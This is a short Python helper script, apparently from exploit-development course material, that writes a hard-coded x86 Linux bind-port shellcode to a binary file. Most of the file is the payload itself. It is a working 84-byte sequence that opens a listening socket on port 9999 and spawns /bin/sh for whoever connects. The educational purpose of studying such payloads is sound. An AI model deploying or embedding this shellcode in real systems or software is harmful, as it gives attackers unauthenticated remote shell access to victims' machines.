#! /usr/bin/env python3

"""
Author: Ram Basnet
September 17, 2021

Program writes the hex shellcode (typically generated by PEDA)
into a binary file.

MIT License
"""

import sys
import binascii

# FIXME: update your binary shellcode...
# x86/linux/bindport: 84 bytes
# port=9999, host=192.168.195.167
shellcode = (
    b"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    b"\x43\x52\x66\x68\x27\x0f\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    b"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    b"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    b"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    b"\x89\xe1\xcd\x80"
)


#FIXME: provide abs or relative path/file_name of the binary file to create
fileName = "../port_bind_shellcode.bin"

# open and write binary to the file

with open(fileName, 'wb') as fout:
    fout.write(shellcode)

print(f'All done! Binary file created: {fileName}') 




